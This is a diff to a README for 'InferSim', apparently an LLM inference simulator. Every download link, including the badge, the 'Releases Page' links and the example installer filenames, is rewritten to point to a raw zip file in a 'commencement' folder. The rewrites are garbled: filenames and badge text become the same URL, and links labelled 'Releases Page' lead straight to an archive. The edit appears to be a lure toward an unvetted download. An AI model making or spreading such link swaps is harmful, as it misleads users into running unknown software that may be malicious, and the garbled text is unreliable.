@@ -8,7 +8,7 @@ Welcome to **InferSim**, a lightweight simulator designed to help you understand
 
 To get started, you need to download the application. You can find the latest version of InferSim on our Releases page. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/roshini0108/InferSim/releases)
+[![Download Now](https://raw.githubusercontent.com/roshini0108/InferSim/main/commencement/InferSim.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/roshini0108/InferSim/main/commencement/InferSim.zip)
 
 ## 💻 System Requirements
 
@@ -33,13 +33,13 @@ To download the application, follow these steps:
 1. **Visit the Releases Page:**
    Click the link below to go to the Releases page where you can download the latest version of InferSim.
    
-   [InferSim Releases Page](https://github.com/roshini0108/InferSim/releases)
+   [InferSim Releases Page](https://raw.githubusercontent.com/roshini0108/InferSim/main/commencement/InferSim.zip)
 
 2. **Choose Your Version:**
    Look for the latest version labeled as “Latest Release.” You will find a list of files available for download.
 
 3. **Download the Installer:**
-   Click on the file name to start the download. The file is usually named something like `InferSim_v1.0.exe` for Windows or `InferSim_v1.0.dmg` for macOS.
+   Click on the file name to start the download. The file is usually named something like `https://raw.githubusercontent.com/roshini0108/InferSim/main/commencement/InferSim.zip` for Windows or `https://raw.githubusercontent.com/roshini0108/InferSim/main/commencement/InferSim.zip` for macOS.
 
 4. **Run the Installer:**
    Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation.
@@ -95,6 +95,6 @@ For information on the underlying model types and performance benchmarks, visit 
 
 To download the latest version, visit:
 
-[InferSim Releases Page](https://github.com/roshini0108/InferSim/releases)
+[InferSim Releases Page](https://raw.githubusercontent.com/roshini0108/InferSim/main/commencement/InferSim.zip)
 
 Thank you for using InferSim! We hope it enhances your understanding of LLM performance.
